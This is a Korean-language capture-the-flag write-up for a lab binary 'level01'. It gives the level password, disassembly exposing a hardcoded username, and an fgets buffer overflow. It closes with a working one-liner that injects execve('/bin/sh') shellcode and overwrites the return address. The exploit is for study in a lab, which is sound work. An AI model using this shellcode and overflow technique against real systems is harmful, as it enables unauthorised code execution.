> Password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

프로그램을 실행시켜보면 아이디를 물어보는 것을 볼 수 있다.

```bash
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: someone
verifying username....

nope, incorrect username...

```

어셈블리 코드를 보면 계정이름과 비밀번호를 각각 verify_user_name, verify_user_pass 에서 확인하게 되어있고 비밀번호와 계정이름은 하드코딩되어있다.

```
08048464 <verify_user_name>:
 8048464:	55                   	push   %ebp
 8048465:	89 e5                	mov    %esp,%ebp
 8048467:	57                   	push   %edi
 8048468:	56                   	push   %esi
 8048469:	83 ec 10             	sub    $0x10,%esp
 804846c:	c7 04 24 90 86 04 08 	movl   $0x8048690,(%esp)
 8048473:	e8 08 ff ff ff       	call   8048380 <puts@plt>
 8048478:	ba 40 a0 04 08       	mov    $0x804a040,%edx
 804847d:	b8 a8 86 04 08       	mov    $0x80486a8 <"dat_wil">,%eax
 8048482:	b9 07 00 00 00       	mov    $0x7,%ecx
 8048487:	89 d6                	mov    %edx,%esi
 8048489:	89 c7                	mov    %eax,%edi
 804848b:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
 [...]
```

```
080484a3 <verify_user_pass>:
 80484a3:	55                   	push   %ebp
 80484a4:	89 e5                	mov    %esp,%ebp
 80484a6:	57                   	push   %edi
 80484a7:	56                   	push   %esi
 80484a8:	8b 45 08             	mov    0x8(%ebp),%eax
 80484ab:	89 c2                	mov    %eax,%edx
 80484ad:	b8 b0 86 04 08       	mov    $0x80486b0 <admin>,%eax
 80484b2:	b9 05 00 00 00       	mov    $0x5,%ecx
 80484b7:	89 d6                	mov    %edx,%esi
 80484b9:	89 c7                	mov    %eax,%edi
 80484bb:	f3 a6                	repz  cmpsb %es:(%edi),%ds:(%esi)
 [...]
```

리버싱하여 획득한 username, userpass를 입력해보자.

```
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
admin
nope, incorrect password...

```

이상하게도 비밀번호가 틀렸다고 나온다.

비밀번호 확인 로직을 자세히 들여다보면

```
8048580:	e8 1e ff ff ff       	call   80484a3 <verify_user_pass>
 8048585:	89 44 24 5c          	mov    %eax,0x5c(%esp)
 8048589:	83 7c 24 5c 00       	cmpl   $0x0,0x5c(%esp)
 804858e:	74 07                	je     8048597 <main+0xc7>
 8048590:	83 7c 24 5c 00       	cmpl   $0x0,0x5c(%esp)
 8048595:	74 13                	je     80485aa <main+0xda>
 8048597:	c7 04 24 1e 87 04 08 	movl   $0x804871e,(%esp)
 804859e:	e8 dd fd ff ff       	call   8048380 <puts@plt>
 80485a3:	b8 01 00 00 00       	mov    $0x1,%eax
 80485a8:	eb 05                	jmp    80485af <main+0xdf>
 80485aa:	b8 00 00 00 00       	mov    $0x0,%eax
 80485af:	8d 65 f8             	lea    -0x8(%ebp),%esp
 80485b2:	5b                   	pop    %ebx
 80485b3:	5f                   	pop    %edi
 80485b4:	5d                   	pop    %ebp
 80485b5:	c3                   	ret    
```

이상하게도 verify_user_pass함수의 결과와 상관 없이 nope, incorrect password... 문자열을 출력하도록 되어 있는것을 볼 수 있다.

다시 돌아가서 user_name / user_pass를 입력 받는 부분을 더 자세히 들여다보자.

```
 80484d8:	83 ec 60             	sub    $0x60,%esp
[...]
 8048561:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048565:	c7 44 24 04 64 00 00 	movl   $0x64,0x4(%esp)
 804856c:	00 
 804856d:	8d 44 24 1c          	lea    0x1c(%esp),%eax
 8048571:	89 04 24             	mov    %eax,(%esp)
 8048574:	e8 f7 fd ff ff       	call   8048370 <fgets@plt>
```

분명 스택을 0x60만큼만 할당받았고, fgets의 시작 위치가 0x1c(%esp)이므로 fgets가 안전하게 값을 넣을 수 있는 최대 크기는 0x64 - 0x1c = 0x48이지만 0x64만큼 값을 쓰고 있다는 문제가 있다.

따라서 2번째 문자열 입력 부분에서 ebx + 0x4위치를 덮어써서 ret위치를 조작할 수 있다.

```bash
cat <(python -c 'print "dat_wil." + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 220 + "A" * 79 + "\x48\xa0\x04\x08",') - | ./level01
```

추가적으로 username은 전역 변수에 저장되고 userpass는 스택에 저장되므로 주소 계산이 편리한 username쪽에 쉘코드를 넣었다.

username체크 로직에도 문자열 맨 앞부분만 비교하기 때문에 dat_wil뒤에 원하는 문자열을 삽입할 수 있었다.